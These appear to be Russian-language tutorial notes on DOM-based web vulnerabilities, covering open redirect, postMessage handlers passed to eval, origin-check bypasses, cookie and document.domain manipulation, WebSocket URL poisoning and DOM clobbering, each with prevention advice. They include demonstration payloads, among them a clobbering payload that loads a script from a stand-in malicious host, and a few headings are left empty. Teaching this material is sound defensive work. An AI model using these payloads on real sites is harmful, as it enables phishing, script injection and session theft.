# 20. Уязвимости на основе DOM (DOM-based vulnerabilities) 
## 1. Что такое DOM?
`Объектная модель документа (DOM)` — это иерархическое представление элементов страницы в браузере. С помощью JavaScript сайты могут изменять узлы, объекты и их свойства в `DOM`.

Само изменение `DOM` не является проблемой — это обычная часть работы современных сайтов. Однако **небезопасная обработка данных в JavaScript может привести к различным атакам**.

Уязвимости на основе `DOM` возникают, когда JavaScript принимает данные, контролируемые злоумышленником, называемые **источником (source)**, и передает их в опасную функцию, называемую **приемником (sink)**.

## 2. Уязвимости потока данных
Многие уязвимости на основе DOM связаны с тем, как клиентский код обрабатывает данные, контролируемые злоумышленником.

### 2.1 Что такое загрязнённый поток?
Чтобы находить и устранять такие уязвимости, сначала важно понять, как загрязнённые данные перемещаются от источников к приёмникам.

#### 2.2 Источники
`Источник` (source) — это место (свойство JS), откуда JavaScript получает данные, которые может контролировать злоумышленник. 

Например, свойство `location.search` является `источником`, потому что получает данные из строки запроса, которую злоумышленник может легко изменить.

Любое свойство, содержимое которого может контролироваться злоумышленником, является потенциальным источником. К ним относятся URL страницы, получаемый через `document.referrer`, файлы cookie через `document.cookie` и веб-сообщения.

### 2.3 Приёмники
**Приёмник (sink)** — это потенциально опасная функция JavaScript или объект `DOM`, который может вызвать нежелательные последствия, если передать ему данные, контролируемые злоумышленником.

Например, функция `eval()` является приёмником, потому что выполняет переданный ей аргумент как JavaScript. Другой пример — `document.body.innerHTML`, поскольку через него злоумышленник потенциально может добавить вредоносный HTML и выполнить произвольный JavaScript.

По сути, уязвимости на основе `DOM` возникают, когда веб-сайт передаёт данные из источника в приёмник, который обрабатывает их небезопасным способом в браузере жертвы.

Наиболее распространённым источником является URL, к которому обычно обращаются через объект `location`. Злоумышленник может создать ссылку на уязвимую страницу и поместить полезную нагрузку в строку запроса или фрагмент URL. Рассмотрим следующий код:
```javascript
goto = location.hash.slice(1)

if (goto.startsWith('https:')) {
    location = goto;
}
```
* `location.hash` — взять всё после **#**.
* `.slice(1)` — убрать первый символ из полученной строки. Это как раз сам **#**.

Этот код уязвим для **открытого перенаправления на основе DOM**, потому что значение из источника `location.hash` используется небезопасно.

Если URL содержит фрагмент, начинающийся с `https:`, код получает значение `location.hash` и устанавливает его в свойство `location` объекта `window`.

Злоумышленник может создать следующий URL:
```text
https://www.innocent-website.com/example#https://www.evil-user.net
```
Когда жертва открывает этот URL, JavaScript устанавливает `location` в значение `https://www.evil-user.net`. В результате браузер автоматически перенаправляет жертву на вредоносный сайт.

Такое поведение, например, можно использовать для фишинговой атаки.

Лучше всего — **белый список разрешённых адресов/путей**. Например, приложение само знает, куда можно перенаправлять:
```js
const allowed = ["/home", "/profile", "/settings"];
if (allowed.includes(goto)) {
    location = goto;
}
```

Следующие виды данных также могут использоваться как источники для атак на уязвимости загрязнённого потока:
- Отражённые данные
- Хранимые данные
- Веб-сообщения

### 3.1 Отражённые данные
Некоторые DOM-уязвимости полностью находятся на стороне клиента. Например, скрипт получает данные из URL и передаёт их в опасный приёмник. В этом случае уязвимость существует только в браузере.

Однако источником данных может быть не только браузер. Данные также может передавать сам веб-сайт. Например, сайт может взять параметр из URL и добавить его в HTML-ответ сервера. Это может привести к DOM XSS.

При **отражённой DOM XSS** сервер получает данные из запроса и возвращает их в ответе. Эти данные могут попасть в JavaScript-код или в элемент DOM, например поле формы. Затем JavaScript небезопасно обрабатывает их и передаёт в опасный приёмник.

```javascript
eval('var data = "reflected string"');
```

### 3.2 Хранимые данные
Сайт также может сохранять полученные данные на сервере и использовать их позже. При **хранимой DOM XSS** сервер получает данные из одного запроса, сохраняет их, а затем добавляет в последующий ответ. JavaScript на странице получает эти данные и небезопасно передаёт их в приёмник.
```javascript
element.innerHTML = comment.author
```

### 3.3 Веб-сообщения
> **веб-сообщение** — это способ, которым JavaScript одной страницы напрямую передаёт данные JavaScript другой страницы/окна: `otherWindow.postMessage("hello", "*");`

Это отличается от GET/POST:
- `GET/POST` → запрос идёт к серверу.
- `Web message (postMessage)` → данные передаются между окнами/страницами в браузере, без обычного HTTP-запроса к серверу.

#### 3.3.1 Контроль источника веб-сообщений
Если страница небезопасно обрабатывает входящие веб-сообщения, например неправильно проверяет их источник, обработчик сообщения может передать данные в опасный приёмник.

Например, злоумышленник может разместить вредоносный `iframe` и через `postMessage()` отправить сообщение уязвимому обработчику на другой странице. Обработчик затем передаст полученные данные в опасный приёмник.

Таким образом, веб-сообщение может использоваться как **источник вредоносных данных**, которые затем попадают в уязвимый приёмник.

#### 3.3.2 Как возникает уязвимость веб-сообщений на основе DOM?
Воздействие такой уязвимости зависит от того, как страница-получатель обрабатывает входящие сообщения. Если она доверяет отправителю и не проверяет, что сообщение не содержит вредоносных данных, а затем небезопасно передаёт эти данные в приёмник, злоумышленник может использовать такое поведение, чтобы скомпрометировать пользователя.

#### 3.3.3 Как создать атаку с помощью веб-сообщений в качестве источника
Рассмотрим следующий код:
```html
<script>
window.addEventListener('message', function(e) {
    eval(e.data);
});
</script>
```

Он уязвим, потому что злоумышленник может передать JavaScript-код через `iframe`:
```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
</iframe>
```
Обработчик сообщения не проверяет его источник, а `postMessage()` использует `targetOrigin="*"`, то есть разрешает отправку сообщения на любой источник. Поэтому обработчик принимает данные и передаёт их в приёмник — в данном случае в функцию `eval()`.

#### 3.3.4 Проверка происхождения
Даже если обработчик сообщения проверяет его источник, такая проверка может быть сделана неправильно. Например:
```javascript
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
    }
});
```
Метод `indexOf()` должен проверить, что сообщение пришло с домена `normal-website.com`. Но на самом деле он только проверяет, встречается ли эта строка **где-либо в URL источника**.

Поэтому злоумышленник может обойти проверку, отправив сообщение, например, с адреса:
```text
http://www.normal-website.com.evil.net
```
Такая же проблема возникает при использовании `startsWith()` и `endsWith()`. Например, следующий обработчик посчитает безопасным источник:
```text
http://www.malicious-websitenormal-website.com
```

```javascript
window.addEventListener('message', function(e) {
    if (e.origin.endsWith('normal-website.com')) {
        eval(e.data);
    }
});
```
#### 3.3.5 Какие приёмники могут привести к уязвимостям веб-сообщений на основе DOM?
Если веб-сайт принимает веб-сообщения из ненадёжного источника из-за неправильной или отсутствующей проверки происхождения, то любой приёмник, который используется обработчиком входящего сообщения, потенциально может привести к уязвимости.

### 4.2 Открытое перенаправление
**Открытое перенаправление на основе DOM** возникает, когда скрипт передаёт данные, контролируемые злоумышленником, в приёмник, который может вызвать переход на другой домен.

Например, следующий код уязвим из-за небезопасной обработки свойства `location.hash`:
```javascript
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
    location = url[0];
}
```
Злоумышленник может создать URL, при переходе по которому другой пользователь будет перенаправлен на произвольный внешний домен.

#### Каково влияние открытого перенаправления на основе DOM?
Такое поведение может использоваться для фишинговых атак. Злоумышленник может создать ссылку на настоящий сайт с правильным доменом и действительным TLS-сертификатом. Пользователь может довериться такой ссылке, даже если проверит домен и сертификат, а затем не заметить перенаправление на другой домен.

Если злоумышленник может контролировать начало строки, передаваемой в API перенаправления, уязвимость иногда можно использовать для **инъекции JavaScript**. Для этого злоумышленник создаёт URL с псевдопротоколом `javascript:`, который позволяет браузеру выполнить произвольный код при обработке URL.

#### Какие приёмники могут привести к уязвимостям открытого перенаправления на основе DOM?

#### Как предотвратить уязвимости открытого перенаправления на основе DOM
Помимо общих мер защиты от DOM-уязвимостей, следует избегать динамического задания адреса перенаправления с использованием данных из ненадёжных источников.

> **Открытое перенаправление** — это когда сайт позволяет указать адрес, на который он автоматически перенаправит пользователя. Например: 
```text
https://example.com/redirect?url=https://evil.example
```
Пользователь думает, что переходит на `example.com`, но сайт перенаправляет его на вредоносный ресурс. В случае **DOM Open Redirect** перенаправление выполняет JavaScript в браузере.

### 4.3 Что такое манипуляции с cookie на основе DOM?
Некоторые DOM-уязвимости позволяют злоумышленнику изменять данные, которые обычно ему недоступны. В результате даже такие безопасные данные, как cookie, могут стать источником атаки.

**Уязвимость манипуляции с cookie на основе DOM** возникает, когда скрипт записывает данные, контролируемые злоумышленником, в значение cookie.

Злоумышленник может создать URL, который при открытии другим пользователем изменит значение его cookie. Многие такие приёмники сами по себе относительно безвредны, но DOM-уязвимость может стать частью цепочки атак. Например, если JavaScript записывает данные из источника в `document.cookie` без предварительной обработки:
```javascript
document.cookie = 'cookieName=' + location.hash.slice(1);
```
Злоумышленник может изменить значение cookie.

Если сайт затем небезопасно выводит значения cookie без HTML-кодирования, эту уязвимость можно использовать для дальнейшей атаки.

#### Каковы последствия?
- Изменение cookie может заставить сайт выполнять нежелательные действия.
- Если cookie хранит сессию, возможна **фиксация сессии** и захват сессии пользователя.
- Уязвимость может затронуть другие сайты в том же родительском домене.

#### Какие приёмники могут привести к уязвимостям манипулирования cookie на основе DOM?
Приёмник `document.cookie` может привести к уязвимостям манипулирования cookie на основе DOM.

#### Как предотвратить уязвимости манипулирования cookie на основе DOM
Помимо общих мер защиты от DOM-уязвимостей, следует избегать динамической записи в cookie данных из ненадёжных источников.

### 4.4 Что такое инъекция JavaScript на основе DOM?
- Возникает, когда скрипт выполняет данные, контролируемые злоумышленником, как JavaScript.
- Злоумышленник может создать URL, при открытии которого другим пользователем выполнится произвольный JavaScript в его браузере.
- Такой URL может распространяться способами, похожими на доставку отражённого XSS.

#### Каково влияние?
- Кража токена сессии или данных для входа.
- Выполнение действий от имени жертвы.
- Перехват нажатий клавиш.

#### Как предотвратить уязвимость?
- Не допускайте выполнения данных из ненадёжных источников как JavaScript.
- Также применяйте общие меры защиты от DOM-уязвимостей.

### 4.5 Манипуляции с документами и доменами (document.domain) DOM
- Уязвимость возникает, когда скрипт использует данные, контролируемые злоумышленником, для установки значения `document.domain`.
- Злоумышленник может создать специальный URL, при открытии которого страница установит нужное ему значение `document.domain`.
- `document.domain` используется браузером для реализации **политики одного источника (Same-Origin Policy)**.
- Если две страницы устанавливают одинаковый `document.domain`, они могут взаимодействовать друг с другом.
- Поэтому злоумышленник может попытаться заставить целевую страницу и контролируемую им страницу установить одинаковый домен.
- После этого он может получить доступ к целевой странице и выполнять действия, похожие на обычный **XSS**.

Браузеры обычно ограничивают значения, которые можно установить в `document.domain`. Но есть важные особенности:
- можно изменить домен на родительский или дочерний;
- некоторые особенности браузеров позволяют использовать даже несвязанные домены.

Поэтому возможность управлять `document.domain` обычно считается серьёзной уязвимостью.

#### Какой приёмник приводит к уязвимости?
Основной приёмник:
```text
document.domain
```

#### Как предотвратить уязвимость?
- Не позволяйте динамически устанавливать `document.domain` данными из ненадёжных источников.
- Также применяйте общие меры защиты от DOM-уязвимостей.

### 4.6 Отравление WebSocket-URL на основе DOM
> **WebSocket** — это сетевой протокол, который создает постоянное двустороннее соединение между браузером и сервером для обмена данными в реальном времени. В `HTTP` связь всегда идет от клиента к серверу (запрос — ответ). В `WebSocket` связь двусторонняя (дуплексная): и клиент, и сервер могут писать первыми.

- Уязвимость возникает, когда скрипт использует данные, контролируемые злоумышленником, как URL для подключения WebSocket.
- Злоумышленник может создать специальный URL, при открытии которого браузер установит WebSocket-соединение с сервером злоумышленника.

#### Каковы последствия?
Последствия зависят от того, как приложение использует `WebSocket`:
- Если браузер отправляет через WebSocket конфиденциальные данные, злоумышленник может получить их.
- Если приложение получает данные от сервера WebSocket и обрабатывает их, злоумышленник может изменить логику работы сайта или выполнить атаку на стороне клиента.

#### Какой приёмник приводит к уязвимости?
Основной приёмник:
```text
WebSocket()
```

#### Как предотвратить уязвимость?
- Не позволяйте данным из ненадёжных источников динамически задавать URL подключения WebSocket.
- Также применяйте общие меры защиты от DOM-уязвимостей.

### 4.7 Манипуляция ссылками на основе DOM
- Уязвимость возникает, когда скрипт записывает данные, контролируемые злоумышленником, в URL ссылки или формы.
- Злоумышленник может создать специальный URL, который при открытии другим пользователем изменит назначение ссылки или формы.

#### Каковы последствия?
Злоумышленник может:
- перенаправить пользователя на внешний сайт, например для фишинга;
- заставить пользователя отправить конфиденциальные данные на сервер злоумышленника;
- изменить URL ссылки и заставить пользователя выполнить нежелательное действие в приложении;
- обойти некоторые XSS-защиты браузера, добавив в ссылку XSS-полезную нагрузку.

#### Какие приёмники приводят к уязвимости?

## 6. DOM-клобберинг
`DOM-клобберинг` — это метод, при котором злоумышленник добавляет HTML на страницу, чтобы изменить `DOM` и в итоге повлиять на работу JavaScript.

Чаще всего для этого используется элемент `<a>`, который позволяет переопределить глобальную переменную. Если приложение затем небезопасно использует эту переменную, например для создания динамического URL скрипта, это может привести к уязвимости.

> **DOM Clobbering**: JavaScript ожидает один объект или свойство, а специально добавленный HTML заставляет браузер подставить вместо него другой DOM-элемент.

> **Вся идея DOM Clobbering**: Злоумышленник не меняет JavaScript напрямую. Он добавляет специально названные HTML-элементы, чтобы браузер создал через них нужные свойства и переменные, которыми потом пользуется JavaScript.

### 6.1 Что такое DOM Clobbering?
`DOM Clobbering` — это метод, при котором злоумышленник добавляет HTML на страницу, чтобы изменить `DOM` и повлиять на работу JavaScript.

Этот метод особенно полезен, когда `XSS` невозможен, но можно добавить HTML на страницу, а атрибуты `id` или `name` разрешены HTML-фильтром.

Чаще всего `DOM Clobbering` использует элемент `<a>` для переопределения глобальной переменной. Затем приложение небезопасно использует эту переменную, например при создании динамического URL скрипта.

Термин «clobbering» означает, что глобальную переменную или свойство объекта **перезаписывают узлом DOM или HTML-коллекцией**. Например, объекты `DOM` могут использоваться для переопределения других объектов JavaScript. Также можно использовать специальные имена, такие как `submit`, чтобы вмешаться в работу функции `submit()` формы.

### 6.2 Как использовать уязвимости DOM-clobbering
Распространённый шаблон в JavaScript:
```javascript
var someObject = window.someObject || {};
```
Если вы можете управлять частью HTML на странице, то можете создать `DOM-элемент` с таким же именем, как `someObject`, и тем самым переопределить эту переменную. Например:
```html
<script>
window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
};
</script>
```
Чтобы использовать этот уязвимый код, можно добавить следующий HTML:
```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```
Два элемента `<a>` имеют одинаковый `id`, поэтому браузер объединяет их в DOM-коллекцию. В результате `someObject` начинает ссылаться на эту коллекцию.

Атрибут `name` второго элемента позволяет задать свойство `url` для `someObject`. В итоге `someObject.url` указывает на внешний вредоносный скрипт.

**Другой распространённый метод** — использовать элемент `form` вместе с `input`, чтобы изменить свойства DOM. Например, можно изменить свойство `attributes` и обойти клиентский фильтр, который использует его для проверки атрибутов.

Фильтр может проверять свойство `attributes`, но из-за `DOM-clobbering` оно будет указывать не на атрибуты `form`, а на другой DOM-элемент. В результате фильтр не увидит вредоносные атрибуты, которые обычно удаляет.

Например:
```html
<form onclick=alert(1)><input id=attributes>Click me
```
В этом случае фильтр проверяет `DOM` и находит разрешённый элемент `form`. Затем он пытается проверить его атрибуты через свойство `attributes`.

Но `input` с `id="attributes"` изменяет это свойство. Поэтому фильтр вместо атрибутов `form` начинает работать с `input`.

В результате проверка не выполняется правильно, и атрибут `onclick` остаётся незамеченным. При нажатии на элемент выполняется `alert()`.

> Фильтр должен проверить атрибуты `form`, но из-за `DOM-clobbering` вместо них проверяет другой элемент.

### 6.3 Как предотвратить атаки DOM
Проще всего защищаться от `DOM Clobbering` с помощью проверок. Нужно убедиться, что объекты и функции действительно являются теми, которыми должны быть.

Например, можно проверить, что свойство `attributes` действительно является объектом `NamedNodeMap`. Это позволяет убедиться, что перед нами настоящие атрибуты, а не подменённый HTML-элемент.

Также следует избегать кода, где глобальная переменная используется вместе с оператором `||`, поскольку такой шаблон может привести к `DOM-уязвимости`.

Подводя итог:
- **Проверяйте объекты и функции.** Если вы работаете с DOM, убедитесь, что объект или функция не были подменены DOM-элементом.
- **Избегайте небезопасных шаблонов кода.** Не используйте глобальные переменные вместе с оператором `||`.
- **Используйте проверенные библиотеки**, например DOMPurify, которые учитывают уязвимости DOM.
